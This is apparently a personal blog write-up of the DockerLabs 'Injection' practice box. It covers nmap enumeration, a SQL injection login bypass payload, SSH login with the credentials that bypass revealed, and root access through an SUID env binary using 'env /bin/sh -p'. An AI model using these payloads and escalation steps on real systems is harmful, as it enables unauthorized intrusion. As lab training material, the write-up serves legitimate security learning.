---
title: "Injection from Dockerlabs"
author: ferbot
date: 2025-07-28 12:00:00 +0800
categories: [dockerlabs, linux]
tags: [dockerlabs, veryeasy, sqli, suid]
description: VeryEasy box from DL with a small twist at privesc
---

### Dockerlabs: Injection

I learned a couple of weeks ago about this website DockerLabs and decided to give it a try. For starters I downloaded a **Very Easy** box to get a nudge of what I will be getting myself into. This box was very straightforward with the injection and SSH password, however I did not expect the privilege escalation to be from abusing SUID but rather a sudo command or old binary abuse, which came as a nice surprise.

### Initial enumeration

As always I started with an nmap scan, the result was as follows.

```bash
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Iniciar Sesi\xC3\xB3n
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Inspecting the website I am greeted by a login page.

![placeholder](/assets/img/dockerlabs/injection/dockerlabs-injection-login.png "Login page")

After making a quick login attempt using the credentials `admin:admin'` (notice the semicolon) I saw the following message.

![placeholder](/assets/img/dockerlabs/injection/dockerlabs-injection-sqli.png "SQL error message")

This implies that there may be an SQL injection in the login form. I copied the request to a file that I used to feed sqlmap.

While sqlmap fetched data, I attempted to login completing the query.

> name=admin&password=admin'+OR+'1'='1'--+-&submit=

Which redirected me to `/acceso_valido_dylan.php` which showed me the following credentials.

> Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78

### First shell

I then attempted to login as dylan (using that password) through the SSH service enumerated before.

```bash
$ ssh dylan@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:5ic4ZXizeEb8agR4jNX59cBONCe5b5iEcU9lf2zt0Q0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.11.2-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dylan@563ef2c2ecf8:~$ 
```

### Privilege escalation

I tried to enumerate on my own the privileges of dylan using sudo but it did not work.

```bash
dylan@563ef2c2ecf8:~$ sudo -l
-bash: sudo: command not found
dylan@563ef2c2ecf8:~$ 
```

I ended up using the classic Linpeas privilege escalation enumeration script to do the trick and noticed the following permission.

![placeholder](/assets/img/dockerlabs/injection/dockerlabs-injection-env-suid.png "env binary suid")

This indicated that the `env` binary had the **SUID** bit set on it.

After reading [GTFObins](https://gtfobins.github.io/gtfobins/env/), I noticed there was a technique to obtain root privileges.

I executed the following and obtained root.

```bash
$ env /bin/sh -p
# cd /root
# echo "No flag like hackthebox!"
```

Overall very fun box. Looking forward to do more from this website.

